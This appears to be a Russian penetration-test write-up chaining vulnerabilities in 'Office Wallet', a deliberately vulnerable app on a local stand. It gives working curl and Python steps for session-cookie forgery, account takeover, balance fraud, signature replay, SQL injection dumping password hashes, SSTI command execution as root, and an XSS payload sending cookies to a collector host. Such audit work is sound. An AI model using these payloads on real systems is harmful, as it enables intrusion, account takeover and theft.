# Цепочки атак Office Wallet

По отдельности находки из [реестра](../README.md#реестр-уязвимостей) — это строки
в таблице. Вместе они складываются в сценарии, где одна уязвимость выполняет
роль, которую следующая не может получить сама: ключ даёт роль, роль даёт
данные, данные превращаются в деньги.

Каждая цепочка ниже расписана по шагам: **запрос → ответ → что изменилось →
почему пролезло**. Все числа — из реального прогона на живом стенде; те же шаги
автоматически проверяются `python3 poc/test_registry.py`, а их полные логи лежат
в карточках `poc/shots/OW-XX.txt`.

Подготовка, одна на все цепочки:

```bash
docker compose up -d --build

# ключ для подделки сессии — лежит в статике, см. Ц-1
KEY=office-wallet-session-key

# база, пароль wallet/wallet из docker-compose.yml
db() { docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc "$1"; }
```

## Ц-1 · Ключ из статики → админка

**Полный лог цепочки:** [CHAIN-1.txt](../poc/shots/CHAIN-1.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-35 (секрет в статике) → сбор HMAC → OW-28 (роль внутри подписи) → /admin/secrets
```

**Что даёт каждый шаг:** OW-35 даёт материал для подписи (SESSION_KEY), OW-28 даёт
готовую форму подделываемой куки. По отдельности: ключ без понимания формата
куки бесполезен, кука без ключа не подделывается.

### Шаг 1 · собираем SESSION_KEY из публичных JS

```bash
curl -s http://localhost:18081/static/wallet.js | grep keyParts
#   keyParts: ["office", "-", "wallet"]
curl -s http://localhost:18081/static/legacy-sync.js | grep SK_TAIL
#   window.__SK_TAIL__ = ["-", "session", "-", "key"];
```

```
GET /static/wallet.js       → HTTP 200, keyParts: ["office", "-", "wallet"]
GET /static/legacy-sync.js  → HTTP 200, __SK_TAIL__ = ["-", "session", "-", "key"]
склейка: "office" + "-" + "wallet" + "-" + "session" + "-" + "key"
       = office-wallet-session-key
```

**Почему пролезло:** `wallet.js` вызывает `sessionKey()` на клиенте — ему нужен
полный ключ, значит куски лежат в открытом JS (CWE-321). Файлы отдаются любому
анонимному запросу, без аутентификации.

### Шаг 2 · определяем uid и собираем подпись

Кука имеет вид `ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, "uid:роль")>`. uid
админа узнаём из открытых мест (нумерация видна в `/api/ops/feed`, `/mail`, нумерация
перебором 1..N):

```bash
db "SELECT id||':'||login||':'||role FROM users WHERE login='adminw';"
#   6:adminw:admin
```

```python
import hmac, hashlib
sig = hmac.new(b"office-wallet-session-key", b"6:admin", hashlib.sha256).hexdigest()
# c59d80997f788119de7c…
cookie = "ow_session=ow.6.admin." + sig
```

### Шаг 3 · открыть админку

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H "Cookie: $cookie" \
  http://localhost:18081/admin/secrets
# 200
```

```
GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>  → HTTP 200
```

**Почему пролезло:** `auth.go:40-43` — после проверки подписи роль берётся из
куки как есть и **не сверяется с базой** (`if role != "" { u.Role = role }`).
Проверяется только HMAC, а ключ мы уже считаем сами.

**Итог:** пароль не нужен, brute не нужен — три запроса, и админка открыта.
Разовые возможности админа: `/gateway/sms` (все коды подтверждений), `/admin/*`.

**Артефакты:** [OW-35](../poc/shots/OW-35.txt) · [OW-28](../poc/shots/OW-28.txt)

## Ц-2 · Админ → захват аккаунта

**Полный лог цепочки:** [CHAIN-2.txt](../poc/shots/CHAIN-2.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-28 (админ-кука из Ц-1) → /gateway/sms (код) → OW-26 (сброс) → вход под жертвой
                                                   OW-27 (альтернативный канал кода)
```

**Что даёт каждый шаг:** OW-28 даёт доступ к SMS-шлюзу, OW-26 — сам механизм
сброса (без срока и лимита), OW-27 — второй канал того же кода на случай, если
шлюз закроют.

### Шаг 1 · триггерим сброс пароля жертве

```bash
curl -s -X POST -d 'login=adminw' http://localhost:18081/password/forgot -o /dev/null
# 302
```

```
POST /password/forgot  login=adminw → HTTP 302
```

Что происходит внутри (`handlers_auth.go:109-131`):

```sql
-- создаётся заявка с 6-значным кодом
INSERT INTO password_resets (user_id, sms_code) VALUES (6, '673407') RETURNING id;
--   → 43
-- код уходит в SMS-лог и в общую почту
INSERT INTO sms_outbox (rid, ...) VALUES (43, ...);
--   body: "Office Wallet: код подтверждения сброса 673407 (заявка #43)"
```

### Шаг 2 · читаем код — два независимых канала

**Канал A — SMS-шлюз под админ-кукой (OW-28):**

```bash
curl -s -H "Cookie: $cookie" http://localhost:18081/gateway/sms | grep сброса
#   код подтверждения сброса 673407 (заявка #43)
```

```
GET /gateway/sms → HTTP 200; извлечено строк кодов: 3
```

**Канал B — общая почта под обычной учёткой (OW-27):**

```bash
# вход под ivanov, роль не нужна
GET /mail → HTTP 200
```

```
адрес текущего пользователя: ivanov@office.local
адреса в ответе: adminw@office.local, sidorov@office.local, …
письмо: «Перейдите по ссылке для сброса пароля …/password/reset?rid=43»
```

**Почему пролезло (OW-27):** `mailBox` отдаёт весь `mail_outbox` без проверки
адресата — любая вошедшая учётка видит чужие письма, включая ссылки сброса.

### Шаг 3 · сбрасываем пароль по коду

```bash
curl -s -X POST -d 'rid=43&sms_code=673407&password=Hack1234' \
  http://localhost:18081/password/reset -o /dev/null -w '%{http_code}\n'
# 302
```

```
POST /password/reset  rid=43&sms_code=673407&password=Hack1234 → HTTP 302
```

Что изменилось в базе:

```sql
-- до
$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
-- после
$2a$10$7RaARAmS4/VeSpErIzadquTgcFRSRRRpafp9dEjpKQ2dulhMCa5R2
```

**Почему пролезло (OW-26):** код — 6 цифр (1 млн вариантов), `rid`
предсказуем (последовательные id), лимита попыток нет, **срок не проверяется**:
в прогоне заявка с `created_at='2000-01-01'` (26 лет назад) принята без
вопросов. Проверка `used=TRUE` есть, но это не спасает от перебора в первые
минуты.

### Шаг 4 · вход под жертвой

```bash
curl -s -c v.jar -X POST -d 'login=adminw&password=Hack1234&return=/' \
  http://localhost:18081/login -o /dev/null -w '%{http_code}\n'
# 302 — сессия выдана
```

```
POST /login  login=adminw&password=Hack1234 → HTTP 302 (кука ow.6.admin.… выдана)
```

**Итог:** полный ATO: атакующий входит под жертвой и оставляет себе
постоянный пароль. Жертва при следующем входе обнаруживает чужой пароль.

**Артефакты:** [OW-28](../poc/shots/OW-28.txt) · [OW-26](../poc/shots/OW-26.txt) ·
[OW-27](../poc/shots/OW-27.txt)

## Ц-3 · Роль → деньги из воздуха

**Полный лог цепочки:** [CHAIN-3.txt](../poc/shots/CHAIN-3.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-35 (ключ) → OW-28 (роль admin/accountant в куке) → /accounting/adjust → OW-05 (возврат ×qty)
```

**Что даёт каждый шаг:** OW-35+OW-28 дают любую роль, `/accounting/adjust` —
прямое начисление, OW-05 — умножение без права на роль (работает даже под
обычным `employee`).

### Шаг 1 · кука с любой ролью (из Ц-1)

```python
cookie = "ow_session=ow.5.accountant." + sign(KEY, "5:accountant")   # бухгалтер
cookie = "ow_session=ow.6.admin."      + sign(KEY, "6:admin")        # админ
```

Роль `admin` проходит и проверку бухгалтерии (`IsAccountant`), и кассу
(`IsCashier`) — одной кукой открываются оба endpoint'а.

### Шаг 2 · начисление через бухгалтерский endpoint

```bash
curl -s -X POST -H "Cookie: $cookie" \
  -d 'login=petrova&delta_rub=1000&reason=poc' \
  http://localhost:18081/accounting/adjust -o /dev/null -w '%{http_code}\n'
# 302
```

```
POST /accounting/adjust  login=petrova&delta_rub=1000   → HTTP 302
petrova balance_kop: 922300 → 1022300   (+100 000 коп = 1 000 ₽)
строка операции: 626|100000|chain-test
```

**Почему пролезло:** `handlers_accounting.go:173-196` проверяет только роль
(`IsAccountant`) и что получатель существует. Ни лимита на сумму, ни лога,
кто начислил (в `memo` пишется **наша** причина), ни подтверждения.

### Шаг 3 · умножение через возврат (OW-05) — уже под обычным employee

```bash
curl -s -X POST -H "Cookie: $emp_cookie" -d 'qty=100' \
  http://localhost:18081/orders/202/return -o /dev/null
```

```
POST /orders/202/return  qty=100
ivanov balance_kop: 189 895 900 → 194 395 900   (+4 500 000 коп)
заказ: 202|returned|45000   (цена заказа 45 000 коп × 100 = 4 500 000)
```

Второй возврат с отрицательным `qty` работает в другую сторону — уводит деньги:

```
POST /orders/203/return  qty=-1
ivanov balance_kop: 194 350 900 → 194 305 900   (−45 000 коп)
```

**Почему пролезло:** `handlers_shop.go` считает `refund = total × qty`, а `qty`
берётся из формы без проверки: ни на количество в заказе, ни на знак, ни на
сумму. `qty=100` при заказе в 450 ₽ печатает 45 000 ₽ одной кнопкой.

**Итог:** эмиссия не ограничена ничем — ни суммой, ни частотой, ни ролью.
Откат возможен только из БД.

**Артефакты:** [OW-35](../poc/shots/OW-35.txt) · [OW-28](../poc/shots/OW-28.txt) ·
[OW-05](../poc/shots/OW-05.txt)

### Ц-3b · Роль → деньги уходят «пополнением»

**Лог шага:** [CHAIN-3b.txt](../poc/shots/CHAIN-3b.txt) · `python3 poc/stage_chains.py`
```
OW-28 (та же admin-кука) → OW-19 (знак суммы не проверяется) → списание у жертвы
```

Та же кука, что в Ц-3, проходит в `IsCashier`:

```bash
curl -s -X POST -H "Cookie: $cookie" \
  -d 'login=petrova&amount_rub=-100' \
  http://localhost:18081/cashier/topup -o /dev/null -w '%{http_code}\n'
# 302
```

```
POST /cashier/topup  login=petrova&amount_rub=-100  → HTTP 302
petrova balance_kop: 922300 → 912300   (−10 000 коп)
строка операции: 627|-10000|Кассовое пополнение   ← минус в «пополнении»
```

**Почему пролезло:** `parseRubToKop` допускает отрицательные числа, а
`cashierTopup` (`handlers_accounting.go:26-37`) проверяет только
`amount != 0`. В журнале операция выглядит как обычное пополнение — учёт
«сходится», но у жертвы деньги ушли.

**Артефакты:** [OW-28](../poc/shots/OW-28.txt) · [OW-19](../poc/shots/OW-19.txt)

## Ц-4 · PAYMENT_KEY → увод денег

**Полный лог цепочки:** [CHAIN-4.txt](../poc/shots/CHAIN-4.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-35 (PAYMENT_KEY в pay.js) → подпись своей рукой → OW-17 (replay без nonce) → деньги жертвы
```

**Что даёт каждый шаг:** OW-35 даёт платёжный ключ (другой, чем сессионный),
OW-17 — слабость формата подписи: она вечная и повторяемая.

### Шаг 1 · собираем PAYMENT_KEY

```bash
curl -s http://localhost:18081/static/pay.js
#   parts: ["office", "-", "wallet", "-", "pay", "-", "key"]
```

```
GET /static/pay.js → HTTP 200; parts склеиваются в: office-wallet-pay-key
```

### Шаг 2 · подписываем платёж сами

Подпись = `HMAC-SHA256(PAYMENT_KEY, "<op_id>:<amount_kop>:<recipient>")`:

```python
sig = sign("office-wallet-pay-key", "0:100:1")   # op=0, 100 коп, получатель id=1
```

```bash
curl -s -X POST -H "Cookie: $victim_cookie" \
  -d "op_id=0&amount_kop=100&recipient=1&sig=$sig" \
  http://localhost:18081/pay/replay -o /dev/null -w '%{http_code}\n'
# 302 → /history  (платёж проведён)
```

```
POST /pay/replay  op_id=0&amount_kop=100&recipient=1&sig=<HMAC наш> → HTTP 302
```

### Шаг 3 · повторяем то же самое — сервер не отличает

Из карточки OW-17 (двойной replay одной подписи):

```
ivanov  balance_kop: 189 941 500 → 189 941 200 → 189 940 900   (−300 ×2)
sidorov balance_kop:     61 600 →     61 900 →     62 200       (+300 ×2)
operations с memo='повтор операции': 73 → 75
HTTP: 200 / 200
```

**Почему пролезло:** `handlers_money.go:428-461` — сверяется только `sig ==
expect`. В подписи нет nonce, нет срока, нет привязки к сессии и к конкретной
операции (`op_id` вообще не существует в базе — подпись считается от
произвольных полей). Плюс поле `to_login` **меняет получателя после проверки
подписи** — подписанное и реальное расходятся.

**Итог:** деньги уходят со счёта жертвы, платёж валиден, повторять можно
бесконечно. Одна подпись = вечный инструмент перевода.

**Артефакты:** [OW-35](../poc/shots/OW-35.txt) · [OW-17](../poc/shots/OW-17.txt)

## Ц-5 · SQL-инъекция → дамп паролей

**Полный лог цепочки:** [CHAIN-5.txt](../poc/shots/CHAIN-5.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-14 (инъекция в сумме перевода) → error-based дамп → хеши всех пользователей
OW-28 (роль) → OW-21 (инъекция в сверке) → второй независимый канал чтения
```

**Что даёт каждый шаг:** OW-14 доступна любому вошедшему, OW-21 закрыт ролью —
роль подделываем (Ц-1), и у атакующего два независимых канала: если первый
закроют, второй останется.

### Шаг 1 · error-based чтение (OW-14, нужна любая учётка)

Сумма из формы попадает в `fmt.Sprintf("SELECT %s::bigint", amountStr)`
без параметризации (`handlers_money.go:172-180`). Приведение строки к bigint
падает, и текст ошибки Postgres возвращается клиенту — вместе с результатом
нашего подзапроса:

```
POST /transfer/new
  recipient=ivanov
  amount_rub=(SELECT string_agg(login||':'||password_hash,';') FROM users)
```

```
← HTTP 200 (страница перевода с текстом ошибки)
  kassa=$2a$10$Zssjo8K34d6BwzSaBwQ/IuwnAxvmun.Mcb8Qfa/Olpbru6qB2/R4S
  buch=$2a$10$k2hQU0/WUG56ehd238qLE.vYvd8aynYmHmAGCEFNfj3cUgueODZYy
  adminw=$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
  sidorov=$2a$10$m.GFGJUh6MIMPjuXqqUG6OlDSVgLYED4vUea1VbEvQKSUnxsTtzTG
  petrova=$2a$10$3yRGTpVXg0YsQZZy7iVH4.CZu/fQwEjG2au0j9ZHnqc8oOZNL0xeS
  ivanov=$2a$10$DQdYa8ulSNI7ufNE7g.wIOwauAGuRjefvh4HpI6l5.yBULozjV9uy
```

Тот же канал — **запь** (и это основной ущерб):

```
amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--
→ ivanov balance_kop: 189 441 500 → 189 941 500   (+500 000 коп)
```

**Почему пролезло:** `Exec` без параметров гоняет несколько команд подряд
(lib/pq), а ошибка возвращается как есть (CWE-209 — отдельно OW-43). Ни одна
проверка приложения между нами и базой не стоит.

### Шаг 2 · UNION-канал через сверку (OW-21 + роль из Ц-1)

Фильтр сверки конкатенируется в `WHERE memo LIKE '%<memo>%'`:

```bash
curl -s -X POST -H "Cookie: $accountant_cookie" \
  --data-urlencode "memo=%' OR '1'='1' --" \
  http://localhost:18081/accounting/reconcile
```

```
контроль memo=ow21_no_such_memo_7f91  → строк в таблице: 2     (честный фильтр)
payload memo=%' OR '1'='1' --          → строк в таблице: 379   (все операции всех)
```

**Почему пролезло:** строка фильтра из формы склеивается с SQL-шаблоном
напрямую; `--` срезает хвост запроса. UNION-вариант вдобавок вытаскивает
строки из `users` прямо в таблицу ответа.

**Итог:** bcrypt-хеши всех учёток утекают (пригодны для офлайн-перебора, пароли
стендовые — одинаковые), плюс канал записи: роли и пароли меняются напрямую.

**Артефакты:** [OW-14](../poc/shots/OW-14.txt) · [OW-21](../poc/shots/OW-21.txt)

## Ц-6 · RCE → root → база

**Полный лог цепочки:** [CHAIN-6.txt](../poc/shots/CHAIN-6.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-08 (SSTI в превью) → uid=0 в ответе (OW-42) и DSN в окружении (OW-34) → psql
```

**Что даёт каждый шаг:** OW-08 даёт выполнение команд, OW-42 — привилегии
(команды идут от root), OW-34 — второй путь к базе без RCE (DSN зашит в
compose). Любое по отдельности критично, вместе — полный захват.

### Шаг 1 · кладём команду в комментарий заказа

```bash
curl -s -X POST -H "Cookie: $cookie" --data-urlencode \
  'item_comment={{exec "id; env | grep _KEY"}}' \
  http://localhost:18081/checkout/quote
# → форма с quote_id; подтверждаем заказ
```

```
POST /checkout/quote  item_comment={{exec "id; env | grep _KEY"}} → заказ #208 создан
```

### Шаг 2 · открываем превью с renderer=classic

```bash
curl -s -H "Cookie: $cookie" \
  'http://localhost:18081/orders/208/preview?renderer=classic'
```

```
GET /orders/208/preview?renderer=classic → HTTP 200
Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac
```

## Ц-7 · XSS → кража сессии

**Полный лог цепочки:** [CHAIN-7.txt](../poc/shots/CHAIN-7.txt) · воспроизводится `python3 poc/stage_chains.py`

```
OW-12 (XSS в истории и чаях) → чтение document.cookie → OW-30 (кука без HttpOnly) → сессия жертвы
```

**Что даёт каждый шаг:** OW-12 даёт выполнение JS на стороне жертвы, OW-30 —
то, что этот JS может унести куку целиком. Без HttpOnly XSS остаётся в рамках
вкладки, с ним — становится выносной.

### Шаг 1 · отражённая XSS мимо фильтра

Фильтр `sanitizeSearchDisplay` — однопроходный denylist
(`script, onerror, javascript:, onload, onmouseover`), результат кладётся в
`QRaw = template.HTML(...)` без экранирования:

```
GET /history?q=<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
← HTTP 200
   …Результаты по запросу: <span><ScRiPt>new Image().src=…document.cookie</ScRiPt></span>…
```

Payload в ответе **байт в байт**, экранирования нет. Регистр ломает denylist
(поиск регистрозависимый), события вроде `ontoggle`/`autofocus onfocus` в него
вообще не входят:

```
GET /history?q=<input autofocus onfocus=new Image().src="…?"+document.cookie>
→ ответ содержит payload без изменений
```

Сохранённый вариант — в чаях: `POST /tips/new comment=<payload>` кладёт
нагрузку в `operations.memo`, а `tips_view.html` отдаёт её как
`TipHTML = template.HTML(memo)`. Открывает получатель при просмотре.

### Шаг 2 · кука читается (OW-30)

```
Set-Cookie: ow_session=ow.1.admin.888b25bca7475d932c148464a139cf1ac039a3678c212962c04ee3b44958b899; Path=/; SameSite=Lax
HttpOnly flag = absent
```

```javascript
// в контексе страницы приложения, после XSS:
document.cookie
// "ow_session=ow.1.employee.<43-hex HMAC>"  ← уходит на http://127.0.0.1:9999
```

**Почему пролезло:** в `auth.go → setSession` флаг `HttpOnly` не ставится
(CWE-1004). А `SameSite=Lax` не мешает: кука и так читается из JS на том же
origin. Украденное значение — готовая сессия, её можно подставить в любой
браузер.

### Шаг 3 · краденая кука живёт своей жизнью (усиление OW-29)

`logout` чистит куку только на клиенте — серверная сессия не отзывается, значит
украденная копия работает и после того, как жертва «выйдёт»:

```
POST /logout → кука удалена в браузере
Cookie: ow_session=<украденная>  → GET / → HTTP 200, кабинет открыт
```

**Итог:** украденная кука = полная сессия жертвы: её деньги, её операции, её
роль. Действия продолжаются после logout, кикнуть атакующего можно только
сменой ключа подписи.

## Связи между цепочками

Цепочки не изолированы — выход одной является входом другой:

```
                    ┌── Ц-2 (ATO) ──────────────┐
                    │   вход под жертвой         │
Ц-1 (админ-кука) ───┼── Ц-3 (деньги)             ├──→ Ц-5 (дамп хешей)
   OW-35 → OW-28    │   начисление + возвраты     │     OW-14 → OW-21
                    └── Ц-3b (списание) ─────────┘
                    
Ц-4 (PAYMENT_KEY) ── OW-35 → OW-17 ──→ переводы от имени жертвы
Ц-6 (RCE) ────────── OW-08 → OW-42 → OW-34 ──→ всё вышеперечисленное разом
Ц-7 (XSS) ────────── OW-12 → OW-30 ──→ сессии без ввода пароля вообще
```

Практический смысл: **закрытие одной точки (утечки `SESSION_KEY` в статике,
OW-35) разрывает Ц-1, Ц-2, Ц-3 и Ц-3b одновременно** — это первое, что чинится
в [FIXES.md](FIXES.md).
